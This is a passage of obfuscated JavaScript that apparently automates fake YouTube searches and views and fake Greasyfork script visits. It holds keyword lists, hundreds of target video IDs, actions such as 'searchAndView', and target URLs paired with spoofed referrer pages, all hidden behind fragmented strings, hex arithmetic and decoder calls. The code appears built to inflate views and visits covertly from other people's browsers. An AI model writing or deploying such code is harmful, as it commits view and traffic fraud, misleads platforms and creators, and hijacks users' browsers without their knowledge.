searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')[X(0xa)](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x3 * 0xcb7 + -0x414 + -0x119 * 0x1f)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x15d * -0x1b + 0x1 * -0x1a35 + -0x1a * 0x68)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x10 * -0x130 + 0x1 * -0x169 + 0x1 * 0x146c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    Y(0x4, '1vgS') + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    Z(0x14) + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x1, 'eP*y') + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x3) + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
